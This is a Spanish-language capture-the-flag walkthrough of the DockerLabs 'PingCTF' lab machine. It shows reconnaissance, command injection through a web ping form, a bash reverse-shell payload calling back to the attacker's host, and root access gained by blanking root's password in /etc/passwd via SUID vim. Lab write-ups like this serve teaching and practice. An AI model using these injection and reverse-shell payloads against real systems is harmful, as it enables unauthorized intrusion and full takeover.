## Introducción

Este documento presenta la resolución completa de la máquina **PingCTF**, desarrollada por *Borazuwarah* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone una herramienta web para realizar pings que es vulnerable a **inyección de comandos**, permitiendo la ejecución remota de comandos como `www-data`. Tras obtener una reverse shell, se enumeran binarios con permisos SUID y se identifica que `vim.basic` puede ejecutarse con privilegios elevados.
Mediante la edición del archivo `/etc/passwd` con Vim, se elimina la contraseña del usuario `root`, permitiendo acceder directamente como superusuario sin autenticación.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip PingCTF.zip
sudo bash auto_deploy.sh PingCTF.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p PingCTF/{content,exploits,nmap,scripts}
cd PingCTF
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763419102/Ports_vezacd.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

Ruta relevante encontrada:
- `/index` — Contiene una herramienta web para realizar pings.

![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1763419102/Index_zy9tyc.png)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Inyección de comandos

La herramienta de ping es vulnerable a **inyección de comandos**. Se prueba con:

```bash
;id
```

![RCE](https://res.cloudinary.com/dewqswzke/image/upload/v1763419103/RCE_hps5r9.png)

### 2.2 Reverse shell

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se inyecta el payload:

```bash
;bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1763419104/Reverseshell_qq3u56.png)

---

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1763419101/Find_bjsv8e.png)

Se identifica que `/usr/bin/vim.basic` tiene permisos SUID.

Se edita el archivo `/etc/passwd` para eliminar la contraseña de `root`:

```bash
/usr/bin/vim.basic /etc/passwd
```

![Vim](https://res.cloudinary.com/dewqswzke/image/upload/v1763419105/Vim_re2d4a.png)

Se modifica la línea de `root` eliminando la `x` (de `root:x:0:0:...` a `root::0:0:...`).

Se inicia sesión como root sin contraseña:

```bash
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763419104/Root_x6g4aa.png)
